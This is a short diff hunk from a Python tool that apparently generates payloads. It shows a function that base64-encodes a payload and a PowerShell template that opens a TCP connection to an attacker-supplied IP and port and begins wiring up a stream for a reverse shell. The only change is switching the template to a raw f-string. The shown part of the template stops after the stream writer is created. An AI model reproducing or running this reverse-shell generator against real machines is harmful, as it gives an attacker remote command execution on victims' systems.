@@ -94,7 +94,7 @@ def _b64_payload(ip: str, port: int) -> str:
     return base64.b64encode(raw.encode()).decode()
 
 def _build_payloads(ip: str, port: int) -> dict[str, str]:
-    _CMD_PAYLOAD = f"""
+    _CMD_PAYLOAD = rf"""
 $client=New-Object Net.Sockets.TCPClient('{ip}',{port})
 $stream=$client.GetStream()
 $writer=New-Object IO.StreamWriter($stream)
